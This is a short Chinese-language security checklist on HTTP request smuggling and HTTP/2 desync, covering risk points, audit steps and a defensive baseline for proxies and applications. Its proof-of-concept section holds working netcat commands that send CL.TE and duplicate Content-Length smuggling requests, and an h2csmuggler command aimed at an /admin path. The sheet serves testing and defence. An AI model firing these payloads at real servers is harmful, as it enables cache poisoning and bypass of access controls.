# HTTP Request Smuggling / HTTP/2 Desync

> CL.TE / TE.CL / TE.TE / HTTP/2 pseudo-header 混淆 / 前后端解析差异

## 高危点
- 前端代理与后端服务器对 Content-Length / Transfer-Encoding 解析不一致 (CL.TE / TE.CL / TE.TE)
- HTTP/2 → HTTP/1 转换时的 header 正规化差异 (`Host` / `:authority` / 重复 header)
- 前缀/后缀路径、双 Content-Length、chunked 伪造
- 重复 Host/X-Forwarded-Host 处理不一致 → 缓存/路由污染

## 检测命令/思路
- 配置审计：Nginx/Envoy/Apache 是否关闭不合法组合（`ignore_invalid_headers on`，严格 chunk 校验，禁止多 CL）
- 日志/代理：是否有 H2→H1 协议转换；是否启用 HTTP/2 cleartext (h2c) 未限源
- 代码审计：是否自己解析 `Content-Length`/`Transfer-Encoding`；是否信任下游/上游传入的值

## 最小 PoC（需测试环境）
```bash
# CL.TE
printf 'POST / HTTP/1.1\r\nHost: victim\r\nContent-Length: 48\r\nTransfer-Encoding: chunked\r\n\r\n0\r\n\r\nG' | nc victim 80

# 双 Content-Length
printf 'POST / HTTP/1.1\r\nHost: victim\r\nContent-Length: 4\r\nContent-Length: 1\r\n\r\nG' | nc victim 80

# HTTP/2 伪造 pseudo-header (需 h2c/h2)
h2csmuggler -u https://victim/ --path /admin
```

## 防护基线
- 网关/反代：禁用/丢弃混合 CL/TE；禁止多 Content-Length；关闭 h2c；严格规范化 header；限制重复 Host/XFH
- 应用：不自行解析 CL/TE；对绝对路径、Host、scheme 做白名单；不信任下游/上游改写的路由/Host
- 日志监控：异常 HTTP 状态、chunk 错误、非法 header 触发告警
